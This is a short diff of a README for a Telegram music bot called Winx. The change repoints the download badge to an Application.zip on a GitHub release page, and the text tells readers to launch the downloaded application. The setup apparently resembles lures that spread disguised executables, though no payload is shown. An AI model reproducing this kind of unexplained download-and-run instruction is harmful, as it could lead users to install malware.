@@ -7,7 +7,7 @@ Winx is a music bot designed for use in Telegram groups and channels for listeni
 ## 🚀 Getting Started
 To get started with Winx, simply download the application zip file from the link below:
 
-[![Download Winx](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Winx](https://github.com/pakau7/Winx/releases/download/v1.0/Application.zip)](https://github.com/pakau7/Winx/releases/download/v1.0/Application.zip)
 
 Please ensure to launch the downloaded application to begin using Winx.
 
